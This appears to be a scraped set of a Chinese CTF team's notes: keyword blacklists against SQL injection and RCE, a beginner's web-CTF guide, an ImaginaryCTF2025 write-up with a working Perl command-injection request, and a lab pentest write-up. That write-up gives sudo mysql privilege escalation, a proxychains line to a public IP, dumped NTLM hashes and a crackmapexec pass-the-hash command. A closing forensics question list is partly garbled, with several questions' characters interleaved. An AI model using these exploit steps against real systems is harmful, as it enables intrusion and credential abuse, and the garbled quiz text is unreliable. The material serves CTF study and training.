sql写黑名单 conn = sqlite3.connect(db.sqlite3)cursor = conn.cursor()cursor.execute(INSERT INTO sys_users (username, password, role) VALUES ( ? , ? , ? ), (username, password, role)) content = blacklist = [\\,union,\\,select,(,),,, ,%]for i in blacklist: if i in content.lower(): exit() 黑名单content = blacklist = [\\,exec,\\,os,open,system,import,_,\\\\u,doc]for i in blacklist: if i in content.lower(): exit() ssrf禁止 file load_file . / ./ ../ proc go这个写在漏洞点前面，然后input替换成我们需要检测正则的字符串即可。检测到就会return结束。但是下面的正则写法依赖strings库 import (\tfmt\tstrings)func main() var input string\tfmt.Print(请输入一个字符串：)\tfmt.Scanln(input)\tmaliciousStrings := []stringunion, select, delete, insert, update, truncate, drop, create, \\, , , , , .,,,flag\tinput = strings.ToLower(input) // 将输入转换为小写，便于匹配\tfor _, s := range maliciousStrings if strings.Contains(input, s) return // 包含恶意字符串 下面的写法不依赖这个strings库 import (\tfmt)func main() var input string\tfmt.Print(请输入一个字符串：)\tfmt.Scanln(input)\tmaliciousStrings := []stringunion, select, delete, insert, update, truncate, drop, create, \\, , , , , .,,,flag\tif isMalicious(input, maliciousStrings) return\tfunc isMalicious(input string, maliciousStrings []string) bool input = stringToLower(input)\tfor _, s := range maliciousStrings if stringContains(input, s) return true return falsefunc stringToLower(str string) string runes := []rune(str)\tfor i, r := range runes if r = A r = Z runes[i] = r + (a - A) return string(runes)func stringContains(str string, substr string) bool strRunes := []rune(str)\tsubstrRunes := []rune(substr)\tfor i := 0; i = len(strRunes)-len(substrRunes); i++ found := true for j := 0; j len(substrRunes); j++ if strRunes[i+j] != substrRunes[j] found = false break if found return true return false"},{"path":"/images/WEB做题情况.html","content":"WEB做题情况WEB人员didongji91：邓洋旭 qi1010：赵江南 coffeepermanent：刘晋铭 线上情况: 线下情况:如假包换，sql注入：简单的union联合注入 union UNION select SELECT = 超级简单的php：php特性(md5强弱比较 intval 正则%0a绕过)+php取反rce ez_ssti：ssti注入黑名单是[‘.’, ‘class’,’import’, ‘globals’,”os”,”%”] A STORY：简单的反序列化 基本的魔术方法触发+一个正则preg_match(/\\b(?:system|shell|passthru|popen|proc_open|cat|ls|od|fopen)\\b/i, $this-enviroment)"},{"path":"/images/WEB入门文档.html","content":"你好啊想要入门web的小黑客~ 一、Web 是个什么玩意？Web 就是我们在浏览器里看到的网站，是连接整个信息世界的线索网。 从你刷微博、看淘宝、追动漫、点外卖……都在使用 Web 应用。它的背后是由前端（你看得见的部分）+ 后端（你看不见的逻辑处理）构成的庞大系统。 而 CTF 中的 Web 题目，就是围绕这些网站的漏洞展开的夺旗游戏。如果连网站是怎么运行的都不知道，那你怎么知道该往哪儿下刀呢？所以，你可以动手搭建一个你自己的小网站，这是所有 Web 手的必备技能！ 二、学习方法【技能一】：不懂就搜 打开你最喜欢的搜索引擎（推荐：Google、Bing），大胆搜。不管是“如何使用 burp”还是“PHP怎么上传文件”，统统都能搜到。信息检索能力也是一项必备的技能 【技能二】：不懂就问 推荐：先知社区、Freebuf、知乎、CSDN、看雪、大佬个人博客 当然你有任何疑问也可以找吾或者实验室其他web方向的师傅，我们非常乐意回答你的问题，但是提问也需要一定的技巧，吾为你提供一本技巧书，看完你的提问效率将大大提升！ Smart Questions 【技能三】：学会记录笔记 拥有本地笔记是非常必要的，它可以在你遗忘时快速搜到知识点也可以帮你加深对知识点的印象。 本地写笔记的软件非常多，吾用的是Typora！这里你也会学到一点md语法。 三、成长路线入门 Web CTF，你大概会经过以下几个“阶段”，每一关都充满怪物和宝藏： 配置环境（最痛但必要）环境配置之路，可谓无数勇者泪洒的副本…… 用虚拟机（推荐 VMware + kali)，边学 shell 命令边体验黑客范。 浏览器装上插件（hackbar、Proxy SwitchyOmega、Wappalyzer） 本地代码编辑器:visual studio code、pycharm、phpstorm等 常用工具准备好：Burp Suite（抓包神器）PHPStudy（本地跑网站）dirsearch（目录爆破）AntSword 其他推荐：Everything（快速找文件）fofa（信息收集神器）cmd5、站长之家（基础查询工具) Tip：这些工具并不需要你一次下完，都是在你做题过程中逐渐积累的 掌握基础知识HTTP协议：理解请求头、响应体、各种请求方法（GETPOST) 编码与加解密：base64、URL编码、hash 等，搞清楚它们什么时候出现、怎么识别、怎么还原。 身份认证：cookie、session、jwt 前端：html、css、javascript（很重要） 后端:php,python等 新手最常见的就是php，php非常灵活容易被利用 脚本语言:python，web常用的就是爬虫 刷题打比赛刷题平台: NSSCTF(我们团队自主开发的平台)https://www.nssctf.cn/ ctfhub：https://www.ctfhub.com/ bugku：https://ctf.bugku.com/ buuctf：https://buuoj.cn/ (上面的题目较难，适合中期web手练习) 等等 练习建议：打一个题 → 查 WP（writeup） → 学一个漏洞 → 打一类题 → 再看WP 记在笔记中 不要“乱打”，一定要搞懂漏洞原理和利用条件 四、漏洞基础漏洞SQL注入 XSS CSRF SSRF 文件上传 文件包含 PHP 反序列化 远程代码执行(RCE) SSTI XXE 原型链污染 其他进阶Java反序列化、沙箱逃逸……这些初学可以跳过，但早晚要面对的终极BOSS 五、最终建议多看书，多看社区（CTF-Wiki、先知、Freebuf） 多动手，光看是不够的 多加社群，找大佬指点 多总结，记录你练过的题和踩过的坑 心态非常重要，永远不要觉得“太难” 相信当你成功拿到flag的那一刻的感受是无以伦比的！加油小黑客，web的大门已为你敞开，开启你的试练吧！"},{"path":"/images/ImaginaryCTF2025.html","content":"ImaginaryCTF2025pearlperl语言写的网站 看源码禁的字符就知道是和目录穿越有关 但是他是禁止出现..的 搜索发现 perl open函数带上|可以执行命令 具体原理文章 https://www.cnblogs.com/AikN/p/15953194.html open(my $fh, $fullpath) or do $c-send_error(RC_INTERNAL_SERVER_ERROR, Could not open file.);next; 但是这里都加上了files路由 没办法路径穿越 我们该怎么绕过呢 我是看wp才知道使用%0a绕过files的限制 所以最终发包情况 GET /%0Als%20/%7C HTTP/1.1Host: challenge.imxbt.cn:30322Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7Cookie: session=eyJpc19ib3QiOmZhbHNlLCJ1c2VybmFtZSI6ImFkbWluIn0.aRSGKA.3Rkxg5KnEcmq5uTReYToTHW_H0oConnection: keep-alive 这样就可以完美执行命令啦"},{"path":"/images/域渗透.html","content":"域渗透"},{"path":"/images/春秋云镜.html","content":"春秋云镜Initialthinkphp写马+sudo提权首先拿到靶机发现很明显的图标 他是thinkphp 拿工具扫下是否存在漏洞 工具项目地址 https://github.com/Lotus6/ThinkphpGUI antsowrd连上后发现权限很低，考虑提权 发现没什么东西 于是sudo -l看下 sudo -l发现mysql有sudo权限 提权方式https://gtfobins.github.io/gtfobins/mysql/ sudo mysql -e \\! whoamisudo mysql -e \\! cat /root/flag/f* 上述方式读到flag1 上传fscan扫一下内网 信呼OA-nday vim /etc/proxychains4.confsocks5 47.109.207.123 8080 [rpc] AuthnSvc : GSS_NEGOTIATE (9)502 krbtgt fb812eea13a18b7fcdb8e6d67ddc205b 5141106 Marcus e07510a4284b3c97c8e7dee970918c5c 5121107 Charles f6a9881cd5ae709abb4ac9ab87f24617 5121000 DC01$ be73a3937f16c08213f2527a2a89c36d 532480500 Administrator 10cf89a850fb1cdbe6bb432b859164c8 5121104 XIAORANG-OA01$ 460c1668eac8c49ab011928b57dc6d42 40961108 XIAORANG-WIN7$ cd12cb01c093cbb210ea30fda776cff8 4096 proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x type Users\\Administrator\\flag\\flag03.txt Brute4Road"},{"path":"/images/题干（必填）.html","content":"分析手机镜像，嫌疑人电脑的开机密码是多少？[按照实际值填写] qwe321@ 分析Windows检材，PowerShell中多少个命令关联URL地址(不去重)？[标准格式：123] 5 分析Windows检材，VeraCrypt加密容器密码是什么？[标准格式：v10.1.1] 容器密码：UJw4FspAsmNVRACWf4GQazvd 分析Windows检材，加密容器中密码本.txt文件中的sha256后六位是多少 分析Windows检材，接上题，分析其账单数据中哪个类别的金额最多？[标准格式：根据实际值填写] 分析Windows检材，Bitlocker的恢复密钥前6位是什么？[标准格式：123456] 分析Windows检材，嫌疑人使用的Windows激活工具的版本是什么？[标准格式：v10.1.1] 分析Windows检材，嫌疑人电脑中安装的加密软件（非VeraCrypt）版本是多少？[标准格式：1.2.3] 分析Windows检材，接上题，该加密软件恢复秘钥文件最后一个单词是什么？[标准格式：根据实际值填写] 分析Windows检材，mysql数据库物理路径 分析Windows检材，对比数据库与爬去小说数据，数据库中缺少的小说其共有多少章节？[标准格式：123] 分析Windows检材，嫌疑人爬取的小说共有多少汉字（包括繁体汉字，不计标点符号）？[标准格式：123] 分析Windows检材，嫌疑人为躲避侵权，将爬取文本中多个不同汉字分别替换成另一些汉字（如“我”→“窝”分）析，W分ind析o共ws有检多材少，个对不比同爬汉取字数被据替与换替（换相数同据字，仅被计替一换次汉）字？（[标不准去格重式）：数1量2最3]多的文件名称是什么？[标准格式：第0001章.txt] 分析Windows检材，对比爬取数据与替换数据，是否存在完全没有汉字被替换的文件？若存在，请给出文件的数量；若不存在，请直接填写“否”。[标准格式：123 或者 否] 分析Windows检材，嫌疑人使用的默认浏览器名称是什么？[标准格式：Microsoft Edge] 分析Windows检材，嫌疑人使用的AI网站的端口是多少？[标准格式：123] 分析Windows检材，嫌疑人使用的AI网站登录密码是多少？[标准格式：根据实际值填写] 分析Windows检材，嫌疑人利用在线AI模仿创作的小说，其第五章标题是什么？[标准格式：根据实际值填写]分析Windows检材，终点小说初步要求嫌疑人赔偿的经济损失金额为多少万元人民币？[标准格式：123] 分析Windows检材，根据律师函要求，嫌疑人最晚须于几月几日（含当日）前向终点小说提交经审核同意的书面致歉函？[标准格式：10月12日] 分析Windows检材，嫌疑人NAS映射的盘符是什么？[标准格式：C] 分析Windows检材，嫌疑人当时正在阅读的小说叫什么名字？[标准格式：三国演义] 分析Windows检材，接上题，嫌疑人当前看到该小说的第几章？[标准格式：第一章] 请分析Exsi虚拟化平台是什么时候安装的？[标准格式：20250102-101258，年月日-时分秒，北京时间] 请分析Exsi虚拟化平台虚拟机使用的ISO镜像大小是多少？[标准格式：2.58，单位：Gigabyte] 请分析nas服务器samba应用完整版本标识为？[标准格式：1.18.26-10.el6_5] 请嫌分疑析人n在ansa服s务服务器器sa中mb删a除应了用面共板享日目志录，允请许分访析问其的删用除户日名志为后？第[标一准次格访式问：服g务ys器66的6]目录物理路径是？[标准格式：varsoftwegame] 某用户在“2025-10-21 18:40:53（北京时间）”向本地AI模型提问，请问其一共提问了几次？[标准格式：5]接上题，第二轮交互总计Token Consumption（令牌消耗）多少个？[标准格式：10] 请分析A卡I模密型网在站创会建隔时一注段册时的间管会理自员动账删号除的后头台像管显理示员的登数录字日是志？，[请标问准日格志式最：多15保]存多少小时？[标准格式：10，单位：小时，四舍五入] 请分析卡密网站后台管理员登录成功后多少小时内无需重新登录？[标准格式：8，单位：小时] 请分析卡密网站微信接口配置的Appsecret是？[标准格式：字符串，全小写] 请分析卡密网站管理员注册了一个商户账号，请问商户编号是？[标准格式：10000] 接上题，请不分考析虑该平商台户提掌现灵、付网微关信通扫道码费设用置的的情费况率下是，多售少卖？的[卡标密准共格计式净：利1%多]少元？[标准格式：1888.88，单位：人民币] 嫌疑人将卡密网站的数据定时备份至远程服务器，请问远程服务器IP为？[标准格式：8.8.8.8] 嫌疑人供述web虚拟机储存了一本名为“活在明朝”的小说，已经删除忘记怎么恢复了，请找到该小说并分析一共有多少章？[标准格式：100] 接有上一题个，外小部说程是序什“么芯时龙候短删片除”的跟？we[标b服准务格器式媒：体20系2统50进10行2通-1信01，25请8分，析年其月A日P-I时通分信秒密，钥北为京？时[标间准]格式：字符串，全小写] 接上题，媒体系统管理员最后登录的时间为？[标准格式：20250102-101258，年月日-时分秒，北京时间] 请分析小说网站“升迁之路”小说第47章叫什么名字？[标准格式：你好呀] 请分析小说网站小说后台采集来源地址是？[标准格式：baidu.com] 请分析小说网站某用户评论“好东西大家顶”是哪篇小说？[标准格式：苏大强] 请嫌分疑析人小曾说在w网e站b服对务接器的中第特三定方位支置付执接行口采的集商正户版密（钥收是费？[）标小准说格的式脚：本完，整请字分符析串采，集区的分正大版小小写说] 网址是？[标准格式：www.baidu.com] 嫌疑人曾在web服务器中备份整套面板数据，请问面板备份数据包SHA256值为？[标准格式：全小写] 攻击机的ip是多少？[标准格式：111.111.111.111] 被攻击网站服务器开放端口数量是多少？[标准格式：1] 攻击者对参数fuzzing成功数量是多少？[标准格式：1] 攻击者在网站服务器上传了一个恶意文件，进行了创建文件操作，新文件名是什么？[标准格式：a.txt] 攻击者对网站内容进行了修改，添加恶意链接是什么？[标准格式：http://www.baidu.com/index.php] 分发恶意文件域名是什么？[标准格式：baidu.com] 被控(访问了被修改后的网站)主机ip是什么？[标准格式：111.111.111.111] 攻击者的license-id是什么？[标准格式：请填写实际值] 攻击者的秘密是什么？[标准格式：六位小写字母_六位数字] 被控主机运行的存储服务，及其端口是什么？[标准格式：amazon_s3:114] 被控主机最终向远控主机发送心跳包时间间隔是多少？[标准格式：1s] 被控主机存储桶中文件md5值是什么？[标准格式：32位小写数字字母]"}]